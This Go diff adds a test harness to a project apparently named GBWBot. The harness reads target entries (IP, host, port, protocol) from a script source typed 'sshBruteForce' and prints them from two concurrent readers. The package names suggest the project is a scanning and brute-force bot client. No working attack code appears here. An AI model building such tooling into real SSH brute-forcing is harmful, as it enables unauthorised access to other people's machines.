@@ -10,6 +10,7 @@ import (
 	"github.com/cbot/proto/transport"
 	"github.com/cbot/targets/genip"
 	"github.com/cbot/targets/local"
+	"github.com/cbot/targets/source"
 	"github.com/cbot/utils/netutils"
 	"github.com/d5/tengo/compiler/token"
 	"github.com/d5/tengo/objects"
@@ -284,11 +285,13 @@ func testTcpScript(){
 	mm.AddMap(stdlib.GetModuleMap("fmt"))
 	script.SetImports(mm)
 
+	script.Compile()
 	// run the script
 	_, err := script.RunContext(context.Background())
 	if err != nil {
 		panic(err)
 	}
+
 
 	//objects.Map{}
 
@@ -414,6 +417,81 @@ func testSSHHost(){
 
 }
 
+func testScriptSource(){
+
+	fpath := "D:\\shajf_dev\\self\\GBWBot\\GBWClientBot\\src\\github.com\\cbot\\cmd\\test\\scriptSource.tengo"
+
+	rtypes := []string {"sshBruteForce"}
+
+	ss,err := source.NewScriptSourceFromFile(rtypes,fpath)
+
+	if err!= nil {
+
+		fmt.Println(err)
+		return
+	}
+
+	reader1,err:= ss.OpenReader("ssh",rtypes,10)
+
+	if err!= nil {
+		fmt.Println(err)
+		return
+	}
+
+
+	reader2,err:= ss.OpenReader("ssh2",rtypes,10)
+
+	if err!= nil {
+		fmt.Println(err)
+		return
+	}
+
+	ss.Start()
+
+	go func (){for {
+
+		entry,err:= reader1.Read()
+
+		if err!=nil {
+
+			fmt.Println(err)
+			break																																																																																																																																																									
+		}
+
+		if entry == nil {
+
+			continue
+		}
+
+		fmt.Printf("{ip:%s,host:%s,port:%d,proto:%s,app:%s}************\n",
+			entry.IP(),entry.Host(),entry.Port(),entry.Proto(),entry.App())
+	}}()
+
+
+	go func (){for {
+
+		entry,err:= reader2.Read()
+
+		if err!=nil {
+
+			fmt.Println(err)
+			break
+		}
+
+		if entry == nil {
+
+			continue
+		}
+
+		fmt.Printf("{ip:%s,host:%s,port:%d,proto:%s,app:%s}----------\n",
+			entry.IP(),entry.Host(),entry.Port(),entry.Proto(),entry.App())
+	}}()
+
+	for {time.Sleep(10*time.Second)}
+
+}
+
+
 func main() {
 
 
@@ -431,7 +509,8 @@ func main() {
 	//testSSH()
 	//testRedis()
 	//testAddr()
-	testSSHHost()
+	//testSSHHost()
 
+	testScriptSource()
 }
 
